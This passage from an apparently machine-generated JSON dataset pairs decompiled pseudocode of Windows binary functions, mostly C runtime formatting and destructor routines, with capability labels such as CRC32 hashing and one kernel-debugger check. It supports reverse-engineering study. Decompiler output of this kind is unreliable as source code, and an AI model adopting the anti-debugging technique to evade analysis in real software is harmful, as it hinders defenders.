*pcVar6;\n    }\n    if (((cVar3 == 'i') || (cVar3 == 'I')) || ((cVar3 == 'n' || (cVar3 == 'N')))) {\n        param_1[8] = param_1[8] & 0xfffffff7;\n        uVar5 = 0;\n        *(param_1 + 0x32) = 0x73;\n    }\n    pcVar1 = pcVar6 + 1;\n    do {\n        cVar3 = *pcVar6;\n        pcVar6 = pcVar6 + 1;\n    } while (cVar3 != '\\0');\n    param_1[0xe] = pcVar6 - pcVar1;\n    return CONCAT31(uVar5 >> 8, 1);\n}\n",
        "token_count": 1162
    },
    "0046bd60": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bd60(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::numpunct_wchar_t_.0;\n    fcn.00404098();\n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "0046bca6": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046bca6(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 79
    },
    "004063ed": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.004063ed(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049ed53:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x0049ed57:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049ed5a:\n            cVar4 = fcn.00401f2d(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049ecff:\n                arg_8h = 0x10;\n                goto code_r0x0049ed5a;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049ed13;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049ece7;\n                }\n            }\ncode_r0x0049ed63:\n            cVar4 = fcn.00405934();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00406582();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049ed63;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049ed13:\n            cVar4 = fcn.004033af(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.0040246e();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049ed63;\n            if (cVar4 == 'i') goto code_r0x0049ed53;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.00403c7e();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00405b00();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049ecff;\n            }\n            goto code_r0x0049ed57;\n        }\ncode_r0x0049ece7:\n        cVar4 = fcn.004013e3();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    cVar4 = fcn.0040210d();\n    if (cVar4 != '\\0') {\n        return 1;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x0049edf8;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049edf8:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403f9e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.004053da(&var_4h, arg_ch, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403f9e(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00402081(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403f9e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1714
    },
    "00401eb5": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00401eb5(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049f024:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x0049f028:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049f02b:\n            cVar4 = fcn.00401df2(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049efd0:\n                arg_8h = 0x10;\n                goto code_r0x0049f02b;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049efe4;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049efb8;\n                }\n            }\ncode_r0x0049f034:\n            cVar4 = fcn.0040100f();\n        }\n        else if (cVar4 == 'Z') {\n            cVar4 = fcn.00405d9e();\n        }\n        else {\n            if (cVar4 == 'a') goto code_r0x0049f034;\n            if (cVar4 != 'c') {\n                return 0;\n            }\ncode_r0x0049efe4:\n            cVar4 = fcn.00402fa4(0);\n        }\n    }\n    else if (cVar4 < 'q') {\n        if (cVar4 == 'p') {\n            cVar4 = fcn.004066a9();\n        }\n        else {\n            if (cVar4 < 'h') goto code_r0x0049f034;\n            if (cVar4 == 'i') goto code_r0x0049f024;\n            if (cVar4 == 'n') {\n                cVar4 = fcn.004034fe();\n            }\n            else {\n                if (cVar4 != 'o') {\n                    return 0;\n                }\n                cVar4 = fcn.00404340();\n            }\n        }\n    }\n    else {\n        if (cVar4 != 's') {\n            if (cVar4 != 'u') {\n                if (cVar4 != 'x') {\n                    return 0;\n                }\n                arg_ch_00 = 0;\n                goto code_r0x0049efd0;\n            }\n            goto code_r0x0049f028;\n        }\ncode_r0x0049efb8:\n        cVar4 = fcn.00404c91();\n    }\n    if (cVar4 == '\\0') {\n        return 0;\n    }\n    if (*(in_ECX + 0x30) != '\\0') {\n        return 1;\n    }\n    arg_ch = 0;\n    var_4h = var_4h._3_1_ << 0x18;\n    uVar1 = *(in_ECX + 0x20);\n    var_8h = 0;\n    if ((uVar1 >> 4 & 1) != 0) {\n        if ((uVar1 >> 6 & 1) == 0) {\n            if ((uVar1 & 1) == 0) {\n                if ((uVar1 >> 1 & 1) != 0) {\n                    var_4h = CONCAT31(var_4h._1_3_, 0x20);\n                    arg_ch = 1;\n                    var_8h = 1;\n                }\n                goto code_r0x0049f0ba;\n            }\n            var_4h = CONCAT31(var_4h._1_3_, 0x2b);\n        }\n        else {\n            var_4h = CONCAT31(var_4h._1_3_, 0x2d);\n        }\n        var_8h = 1;\n        arg_ch = 1;\n    }\ncode_r0x0049f0ba:\n    cVar4 = *(in_ECX + 0x31);\n    if (((cVar4 == 'x') || (cVar4 == 'X')) && ((uVar1 >> 5 & 1) != 0)) {\n        bVar2 = true;\n    }\n    else {\n        bVar2 = false;\n    }\n    if ((cVar4 == 'a') || (cVar4 == 'A')) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((bVar2) || (bVar3)) {\n        *(&var_4h + arg_ch) = 0x30;\n        if ((cVar4 == 'X') || (cVar4 == 'A')) {\n            uVar5 = 0x58;\n        }\n        else {\n            uVar5 = 0x78;\n        }\n        *(&var_4h + arg_ch + 1) = uVar5;\n        arg_ch = arg_ch + 2;\n        var_8h = arg_ch;\n    }\n    arg_14h = in_ECX + 0x18;\n    arg_10h = (*(in_ECX + 0x24) - *(in_ECX + 0x38)) - arg_ch;\n    if ((*(in_ECX + 0x20) & 0xc) == 0) {\n        fcn.00403f9e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n        arg_ch = var_8h;\n    }\n    fcn.004053da(&var_4h, arg_ch, arg_14h);\n    if (((*(in_ECX + 0x20) >> 3 & 1) != 0) && ((*(in_ECX + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403f9e(in_ECX + 0x448, 0x30, arg_10h, arg_14h);\n    }\n    fcn.00401843(0);\n    if ((-1 < *arg_14h) && ((*(in_ECX + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403f9e(in_ECX + 0x448, 0x20, arg_10h, arg_14h);\n    }\n    return 1;\n}\n",
        "token_count": 1686
    },
    "00401f2d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401f2d(uint arg_8h, uint arg_ch)\n\n{\n    char cVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_ch_00;\n    uint32_t arg_8h_00;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00402739(*(in_ECX + 0x2c));\n    var_ch = 0;\n    var_8h = 0;\n    if (var_4h == 1) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040187a(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00404e03(&var_ch);\n        }\n    }\n    else if (var_4h == 2) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.00405277(&var_ch);\n        }\n        else {\n            cVar1 = fcn.00401569(&var_ch);\n        }\n    }\n    else if (var_4h == 4) {\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.0040605f(&var_ch);\n        }\n        else {\n            cVar1 = fcn.0040590c(&var_ch);\n        }\n    }\n    else {\n        if (var_4h != 8) {\n            puVar2 = fcn.004039a4();\n            *puVar2 = 0x16;\n            fcn.00403751();\n            return 0;\n        }\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            cVar1 = fcn.004048d1(&var_ch);\n        }\n        else {\n            cVar1 = fcn.004055ba(&var_ch);\n        }\n    }\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.00405128();\n    if (cVar1 != '\\0') {\n        uVar3 = *(in_ECX + 0x20);\n        arg_ch_00 = var_8h;\n        arg_8h_00 = var_ch;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n            uVar3 = uVar3 | 0x40;\n            *(in_ECX + 0x20) = uVar3;\n            arg_ch_00 = -(var_8h + (var_ch != 0));\n            arg_8h_00 = -var_ch;\n        }\n        if (*(in_ECX + 0x28) < 0) {\n            *(in_ECX + 0x28) = 1;\n        }\n        else {\n            *(in_ECX + 0x20) = uVar3 & 0xfffffff7;\n            fcn.00404bb5(*(in_ECX + 0x28));\n        }\n        if ((arg_8h_00 | arg_ch_00) == 0) {\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n        }\n        *(in_ECX + 0x3c) = 0;\n        if (var_4h == 8) {\n            fcn.004041f6(arg_8h_00, arg_ch_00, arg_8h, arg_ch);\n        }\n        else {\n            fcn.00405e02(arg_8h_00, arg_8h, arg_ch);\n        }\n        if (((*(in_ECX + 0x20) >> 7 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (**(in_ECX + 0x34) != '0')))) {\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + -1;\n            **(in_ECX + 0x34) = 0x30;\n            *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1021
    },
    "00402699": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00402699(int32_t param_1)\n\n{\n    int32_t arg_8h;\n    int16_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    bool bVar4;\n    char cVar5;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint unaff_ESI;\n    ushort uVar6;\n    uint16_t uVar7;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    uint var_14h;\n    int32_t var_10h;\n    uint32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x56cca8 ^ &stack0xfffffffc;\n    uVar7 = *(param_1 + 0x32);\n    if (uVar7 < 0x65) {\n        if (uVar7 == 100) {\ncode_r0x004a01d9:\n            *(param_1 + 0x20) = *(param_1 + 0x20) | 0x10;\ncode_r0x004a01dd:\n            arg_ch_00 = 0;\n            arg_8h_00 = 10;\ncode_r0x004a01e0:\n            cVar5 = fcn.00401587(arg_8h_00, arg_ch_00);\n        }\n        else if (uVar7 < 0x59) {\n            if (uVar7 == 0x58) {\n                arg_ch_00 = 1;\ncode_r0x004a0185:\n                arg_8h_00 = 0x10;\n                goto code_r0x004a01e0;\n            }\n            if (uVar7 != 0x41) {\n                if (uVar7 == 0x43) goto code_r0x004a0199;\n                if (uVar7 < 0x45) goto code_r0x004a0369;\n                if (0x47 < uVar7) {\n                    if (uVar7 != 0x53) goto code_r0x004a0369;\n                    goto code_r0x004a016d;\n                }\n            }\ncode_r0x004a01e9:\n            cVar5 = fcn.00405146();\n        }\n        else if (uVar7 == 0x5a) {\n            cVar5 = fcn.004028c9();\n        }\n        else {\n            if (uVar7 == 0x61) goto code_r0x004a01e9;\n            if (uVar7 != 99) goto code_r0x004a0369;\ncode_r0x004a0199:\n            cVar5 = fcn.00406505(0);\n        }\n    }\n    else if (uVar7 < 0x71) {\n        if (uVar7 == 0x70) {\n            cVar5 = fcn.00402388();\n        }\n        else {\n            if (uVar7 < 0x68) goto code_r0x004a01e9;\n            if (uVar7 == 0x69) goto code_r0x004a01d9;\n            if (uVar7 == 0x6e) {\n                cVar5 = fcn.004063d9();\n            }\n            else {\n                if (uVar7 != 0x6f) goto code_r0x004a0369;\n                cVar5 = fcn.00401e15();\n            }\n        }\n    }\n    else {\n        if (uVar7 != 0x73) {\n            if (uVar7 != 0x75) {\n                if (uVar7 != 0x78) goto code_r0x004a0369;\n                arg_ch_00 = 0;\n                goto code_r0x004a0185;\n            }\n            goto code_r0x004a01dd;\n        }\ncode_r0x004a016d:\n        cVar5 = fcn.00401870();\n    }\n    if ((cVar5 == '\\0') || (*(param_1 + 0x30) != '\\0')) goto code_r0x004a0369;\n    arg_ch = 0;\n    var_ch = 0;\n    var_8h._0_2_ = 0;\n    uVar2 = *(param_1 + 0x20);\n    var_10h = 0;\n    if ((uVar2 >> 4 & 1) != 0) {\n        if ((uVar2 >> 6 & 1) == 0) {\n            if ((uVar2 & 1) == 0) {\n                if ((uVar2 >> 1 & 1) != 0) {\n                    var_ch = 0x20;\n                    arg_ch = 1;\n                    var_10h = 1;\n                }\n                goto code_r0x004a0274;\n            }\n            uVar7 = 0x2b;\n        }\n        else {\n            uVar7 = 0x2d;\n        }\n        var_ch = uVar7;\n        var_10h = 1;\n        arg_ch = 1;\n    }\ncode_r0x004a0274:\n    iVar1 = *(param_1 + 0x32);\n    if (((iVar1 == 0x78) || (iVar1 == 0x58)) && ((uVar2 >> 5 & 1) != 0)) {\n        bVar3 = true;\n    }\n    else {\n        bVar3 = false;\n    }\n    if ((iVar1 == 0x61) || (iVar1 == 0x41)) {\n        bVar4 = true;\n    }\n    else {\n        bVar4 = false;\n    }\n    if ((bVar3) || (bVar4)) {\n        *(&var_ch + arg_ch * 2) = 0x30;\n        if ((iVar1 == 0x58) || (uVar6 = 0x78,  iVar1 == 0x41)) {\n            uVar6 = 0x58;\n        }\n        *(&var_ch + arg_ch * 2 + 2) = uVar6;\n        arg_ch = arg_ch + 2;\n        var_10h = arg_ch;\n    }\n    arg_8h = param_1 + 0x448;\n    arg_10h = (*(param_1 + 0x24) - *(param_1 + 0x38)) - arg_ch;\n    if ((*(param_1 + 0x20) & 0xc) == 0) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n        arg_ch = var_10h;\n    }\n    fcn.00402937(&var_ch, arg_ch, param_1 + 0x18);\n    if (((*(param_1 + 0x20) >> 3 & 1) != 0) && ((*(param_1 + 0x20) >> 2 & 1) == 0)) {\n        fcn.00403f2b(arg_8h, 0x30, arg_10h, param_1 + 0x18);\n    }\n    fcn.004038b4(0);\n    if ((-1 < *(param_1 + 0x18)) && ((*(param_1 + 0x20) >> 2 & 1) != 0)) {\n        fcn.00403f2b(arg_8h, 0x20, arg_10h, param_1 + 0x18);\n    }\ncode_r0x004a0369:\n    fcn.00403085(unaff_ESI);\n    return;\n}\n",
        "token_count": 1724
    },
    "00462293": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00462293(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::exception.0;\n    fcn.00405a60(in_ECX + 1);\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "0040218f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint32_t fcn.0040218f(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t var_8h_2;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    int32_t var_10h_2;\n    code *pcStack16;\n    uint32_t uStack12;\n    uint var_4h;\n    \n    pcStack16 = fcn.00484d90;\n    var_10h_2 = *in_FS_OFFSET;\n    uStack12 = *0x56cca8 ^ 0x56b638;\n    *in_FS_OFFSET = &var_10h_2;\n    var_4h = 0;\n    iVar2 = fcn.00401cdf(0x400000);\n    if (iVar2 != 0) {\n        iVar2 = fcn.00401b68(0x400000, var_8h_2 + -0x400000);\n        if (iVar2 != 0) {\n            uVar1 = *(iVar2 + 0x24);\n            *in_FS_OFFSET = var_10h_2;\n            return ~(uVar1 >> 0x1f) & 1;\n        }\n    }\n    *in_FS_OFFSET = var_10h_2;\n    return 0;\n}\n",
        "token_count": 310
    },
    "00402202": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402202(int32_t param_1)\n\n{\n    if ((*(param_1 + 0x20) >> 5 & 1) != 0) {\n        *(param_1 + 0x20) = *(param_1 + 0x20) | 0x80;\n    }\n    fcn.00402306(8, 0);\n    return;\n}\n",
        "token_count": 90
    },
    "00402306": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00402306(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int16_t *piVar4;\n    int32_t in_ECX;\n    uint32_t uVar5;\n    uint32_t arg_ch_00;\n    bool bVar6;\n    uint var_4h;\n    \n    iVar1 = fcn.00402739(*(in_ECX + 0x2c));\n    if (iVar1 == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else if (iVar1 == 2) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n        else {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n        }\n    }\n    else {\n        if (iVar1 != 4) {\n            if (iVar1 != 8) {\n                puVar2 = fcn.004039a4();\n                *puVar2 = 0x16;\n                uVar3 = fcn.00403751();\n                return uVar3 & 0xffffff00;\n            }\n            *(in_ECX + 0x14) = *(in_ECX + 0x14) + 8;\n            uVar3 = *(*(in_ECX + 0x14) + -8);\n            arg_ch_00 = *(*(in_ECX + 0x14) + -4);\n            goto code_r0x004a3e55;\n        }\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        if ((*(in_ECX + 0x20) >> 4 & 1) == 0) {\n            uVar3 = *(*(in_ECX + 0x14) + -4);\n            arg_ch_00 = 0;\n            goto code_r0x004a3e55;\n        }\n        uVar3 = *(*(in_ECX + 0x14) + -4);\n    }\n    arg_ch_00 = uVar3 >> 0x1f;\ncode_r0x004a3e55:\n    uVar5 = *(in_ECX + 0x20);\n    if ((((uVar5 >> 4 & 1) != 0) && (arg_ch_00 < 1)) && (arg_ch_00 < 0)) {\n        bVar6 = uVar3 != 0;\n        uVar3 = -uVar3;\n        arg_ch_00 = -(arg_ch_00 + bVar6);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x20) = uVar5;\n    }\n    if (*(in_ECX + 0x28) < 0) {\n        *(in_ECX + 0x28) = 1;\n    }\n    else {\n        *(in_ECX + 0x20) = uVar5 & 0xfffffff7;\n        fcn.004057e0(*(in_ECX + 0x28));\n    }\n    if ((uVar3 | arg_ch_00) == 0) {\n        *(in_ECX + 0x20) = *(in_ECX + 0x20) & 0xffffffdf;\n    }\n    *(in_ECX + 0x3c) = 1;\n    if (iVar1 == 8) {\n        fcn.00404e8f(uVar3, arg_ch_00, arg_8h, arg_ch);\n    }\n    else {\n        fcn.004064bf(uVar3, arg_8h, arg_ch);\n    }\n    piVar4 = *(in_ECX + 0x20) >> 7;\n    if (((piVar4 & 1) != 0) && ((*(in_ECX + 0x38) == 0 || (piVar4 = *(in_ECX + 0x34),  *piVar4 != 0x30)))) {\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + -2;\n        **(in_ECX + 0x34) = 0x30;\n        *(in_ECX + 0x38) = *(in_ECX + 0x38) + 1;\n    }\n    return CONCAT31(piVar4 >> 8, 1);\n}\n",
        "token_count": 1120
    },
    "00402315": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402315(uint *arg_8h)\n\n{\n    char cVar1;\n    uint *arg_8h_00;\n    uint uVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint32_t uVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if ((**0x56f458 != '\\0') && (**0x56f458 == '_')) {\n        cVar1 = (*0x56f458)[1];\n        if ((cVar1 != '\\0') && (cVar1 < 'E')) {\n            uVar4 = 0;\n            uVar3 = (*0x56f458)[1] - 0x41;\n            *0x56f458 = *0x56f458 + 2;\n            if (uVar3 < 4) {\n                var_8h = 0;\n                var_4h = 0;\n                uVar2 = 0;\n                if ((~(*0x56f460 >> 1) & 1) != 0) {\n                    fcn.00403cba(0x20);\n                    _var_10h = fcn.00402ce3(0xe);\n                    fcn.00405c95(&var_10h);\n                    if (uVar3 != 0) {\n                        while( true ) {\n                            uVar5 = -uVar3 & uVar3;\n                            if (uVar5 == 1) {\n                                var_18h = 0x54f68c;\n                                arg_8h_00 = &var_18h;\n                                var_14h = 3;\n                            }\n                            else {\n                                if (uVar5 != 2) goto code_r0x0048f253;\n                                arg_8h_00 = &var_10h;\n                                _var_10h = 0x30054f690;\n                            }\n                            fcn.00405c95(arg_8h_00);\n                            uVar3 = uVar3 & ~uVar5;\n                            if (uVar3 == 0) break;\n                            var_20h = 0x54f694;\n                            var_1ch = 2;\n                            fcn.00405c95(&var_20h);\n                        }\n                    }\n                    fcn.00403cba(0x29);\n                    uVar2 = var_4h;\n                    uVar4 = var_8h;\n                }\n                arg_8h[1] = uVar2;\n            }\n            else {\ncode_r0x0048f253:\n                arg_8h[1] = 0;\n                *(arg_8h + 1) = 2;\n            }\n            goto code_r0x0048f267;\n        }\n    }\n    uVar4 = 0;\n    arg_8h[1] = 0;\ncode_r0x0048f267:\n    *arg_8h = uVar4;\n    return;\n}\n",
        "token_count": 689
    },
    "0046b997": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0046b997(uint32_t arg_8h)\n\n{\n    code **in_ECX;\n    \n    *in_ECX = vtable.std::_Facet_base.0;\n    if ((arg_8h & 1) != 0) {\n        fcn.00401a32(in_ECX);\n    }\n    return;\n}\n",
        "token_count": 78
    },
    "00402342": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00402342(uint32_t arg_8h)\n\n{\n    return;\n}\n",
        "token_count": 23
    },
    "00402351": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00402351(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint arg_30h)\n\n{\n    int32_t *arg_14h;\n    uint32_t uVar1;\n    bool bVar2;\n    bool bVar3;\n    char cVar4;\n    uchar uVar5;\n    int32_t in_ECX;\n    int32_t arg_ch;\n    int32_t arg_10h;\n    uint arg_8h;\n    uint arg_ch_00;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    cVar4 = *(in_ECX + 0x31);\n    var_4h = in_ECX;\n    if (cVar4 < 'e') {\n        if (cVar4 == 'd') {\ncode_r0x0049e248:\n            *(in_ECX + 0x20) = *(in_ECX + 0x20) | 0x10;\ncode_r0x0049e24c:\n            arg_ch_00 = 0;\n            arg_8h = 10;\ncode_r0x0049e24f:\n            cVar4 = fcn.00402e64(arg_8h, arg_ch_00);\n        }\n        else if (cVar4 < 'Y') {\n            if (cVar4 == 'X') {\n                arg_ch_00 = 1;\ncode_r0x0049e1f4:\n                arg_8h = 0x10;\n                goto code_r0x0049e24f;\n            }\n            if (cVar4 != 'A') {\n                if (cVar4 == 'C') goto code_r0x0049e208;\n                if (cVar4 < 'E') {\n                    return 0;\n                }\n                if ('G' < cVar4) {\n                    if (cVar4 != 'S') {\n                        return 0;\n                    }\n                    goto code_r0x0049e1dc;\n                }\n            }\ncode_r0x0049e258:\n            